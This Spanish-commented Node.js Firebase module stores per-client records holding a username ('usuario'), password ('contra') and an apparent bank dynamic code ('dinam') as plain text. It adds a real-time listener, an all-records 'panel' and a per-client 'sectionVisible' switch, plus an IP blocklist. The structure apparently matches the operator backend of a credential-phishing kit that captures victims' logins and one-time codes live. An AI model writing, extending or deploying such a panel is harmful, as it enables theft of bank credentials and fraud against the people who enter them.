/**
 * firebaseService.js
 * Firebase Admin SDK — inicialización y helpers para Firestore
 * Las credenciales NUNCA se exponen al frontend
 */

const admin = require('firebase-admin');
const path = require('path');

// ── Inicializar Firebase Admin ────────────────────────────────────────────────
let db;
try {
  let serviceAccount;

  if (process.env.FIREBASE_SERVICE_ACCOUNT_B64) {
    // Producción: credenciales como Base64
    const jsonStr = Buffer.from(process.env.FIREBASE_SERVICE_ACCOUNT_B64, 'base64').toString('utf8');
    serviceAccount = JSON.parse(jsonStr);
  } else if (process.env.FIREBASE_SERVICE_ACCOUNT_JSON) {
    serviceAccount = JSON.parse(process.env.FIREBASE_SERVICE_ACCOUNT_JSON);
    if (serviceAccount.private_key) {
      serviceAccount.private_key = serviceAccount.private_key.replace(/\\n/g, '\n');
    }
  } else {
    // Local: cargar desde archivo
    const serviceAccountPath = path.resolve(__dirname, '..', process.env.FIREBASE_SERVICE_ACCOUNT || './serviceAccountKey.json');
    serviceAccount = require(serviceAccountPath);
  }

  admin.initializeApp({
    credential: admin.credential.cert(serviceAccount)
  });
  db = admin.firestore();
  console.log('✅ Firebase Admin SDK inicializado correctamente');
} catch (err) {
  console.error('❌ Error al inicializar Firebase:', err.message);
  console.error('   Local: asegúrate de que el JSON existe en server/');
  console.error('   Azure: configura FIREBASE_SERVICE_ACCOUNT_JSON en App Settings');
  process.exit(1);
}

// ── Colección de clientes ─────────────────────────────────────────────────────
const CLIENTES_COLLECTION = 'clientes';
const BLACKLIST_COLLECTION = 'ip_blacklist';

// Campos permitidos (whitelist para evitar inyección de datos arbitrarios)
const CAMPOS_PERMITIDOS = [
  'usuario', 'contra', 'dinam', 'sectionVisible'
];

// ── Helpers ───────────────────────────────────────────────────────────────────

/**
 * Obtener un cliente por su clienteid
 */
async function getCliente(clienteid) {
  const doc = await db.collection(CLIENTES_COLLECTION).doc(clienteid).get();
  if (!doc.exists) return null;
  return { clienteid: doc.id, ...doc.data() };
}

/**
 * Escribir/actualizar datos de un cliente
 * Solo permite campos de la whitelist + ip + created_at
 */
async function setCliente(clienteid, data) {
  const sanitized = {};
  for (const campo of CAMPOS_PERMITIDOS) {
    if (data[campo] !== undefined) {
      sanitized[campo] = String(data[campo]);
    }
  }
  // IP se inyecta server-side
  if (data.ip) {
    sanitized.ip = String(data.ip);
  }
  // Timestamp solo en la primera escritura
  sanitized.created_at = admin.firestore.FieldValue.serverTimestamp();

  // merge:true → crea el doc si no existe, o FUSIONA campos sin borrar los existentes
  const docRef = db.collection(CLIENTES_COLLECTION).doc(clienteid);
  await docRef.set(sanitized, { merge: true });

  return sanitized;
}

/**
 * Obtener sectionVisible de un cliente
 */
async function getSection(clienteid) {
  const doc = await db.collection(CLIENTES_COLLECTION).doc(clienteid).get();
  if (!doc.exists) return null;
  const data = doc.data();
  return {
    sectionVisible: data.sectionVisible || ''
  };
}

/**
 * Obtener todos los clientes (para el panel)
 */
async function getAllClientes() {
  const snapshot = await db.collection(CLIENTES_COLLECTION)
    .orderBy('created_at', 'desc')
    .get();
  const clientes = [];
  snapshot.forEach(doc => {
    clientes.push({ clienteid: doc.id, ...doc.data() });
  });
  return clientes;
}

/**
 * Eliminar un cliente
 */
async function deleteCliente(clienteid) {
  await db.collection(CLIENTES_COLLECTION).doc(clienteid).delete();
}

/**
 * Eliminar todos los clientes
 */
async function deleteAllClientes() {
  const snapshot = await db.collection(CLIENTES_COLLECTION).get();
  const batch = db.batch();
  snapshot.forEach(doc => {
    batch.delete(doc.ref);
  });
  await batch.commit();
}

// ── Firestore Listener (onSnapshot) ──────────────────────────────────────────
let _snapshotUnsubscribe = null;

/**
 * Iniciar listener en tiempo real sobre la colección clientes.
 * Cuando un documento cambia, invoca el callback con los datos del cambio.
 * 
 * @param {Function} onChange - callback(clienteid, data, changeType)
 *   changeType: 'added' | 'modified' | 'removed'
 */
function startCollectionListener(onChange) {
  if (_snapshotUnsubscribe) {
    _snapshotUnsubscribe();
  }

  _snapshotUnsubscribe = db.collection(CLIENTES_COLLECTION)
    .onSnapshot(snapshot => {
      snapshot.docChanges().forEach(change => {
        const clienteid = change.doc.id;
        const data = change.doc.data();
        onChange(clienteid, data, change.type);
      });
    }, err => {
      console.error('❌ Error en onSnapshot:', err);
    });

  console.log('👂 Listener de Firestore activo en colección:', CLIENTES_COLLECTION);
}

// ── IP Blacklist en Firestore (persistencia) ─────────────────────────────────

/**
 * Guardar IP bloqueada en Firestore (respaldo persistente)
 */
async function saveBlockedIP(ip, duration) {
  const data = {
    reason: 'rate_limit_exceeded',
    blocked_at: admin.firestore.FieldValue.serverTimestamp(),
    expires_at: duration > 0
      ? admin.firestore.Timestamp.fromMillis(Date.now() + duration * 1000)
      : null
  };
  await db.collection(BLACKLIST_COLLECTION).doc(ip).set(data);
}

/**
 * Eliminar IP de la blacklist de Firestore
 */
async function removeBlockedIP(ip) {
  await db.collection(BLACKLIST_COLLECTION).doc(ip).delete();
}

/**
 * Obtener todas las IPs bloqueadas
 */
async function getBlockedIPs() {
  const now = admin.firestore.Timestamp.now();
  const snapshot = await db.collection(BLACKLIST_COLLECTION).get();
  const blocked = [];
  snapshot.forEach(doc => {
    const data = doc.data();
    // Solo incluir si no ha expirado
    if (!data.expires_at || data.expires_at.toMillis() > now.toMillis()) {
      blocked.push({
        ip: doc.id,
        reason: data.reason || '',
        blocked_at: data.blocked_at ? data.blocked_at.toDate().toISOString() : '',
        expires_at: data.expires_at ? data.expires_at.toDate().toISOString() : null
      });
    }
  });
  return blocked;
}

module.exports = {
  db,
  getCliente,
  setCliente,
  getSection,
  getAllClientes,
  deleteCliente,
  deleteAllClientes,
  startCollectionListener,
  saveBlockedIP,
  removeBlockedIP,
  getBlockedIPs,
  CAMPOS_PERMITIDOS
};
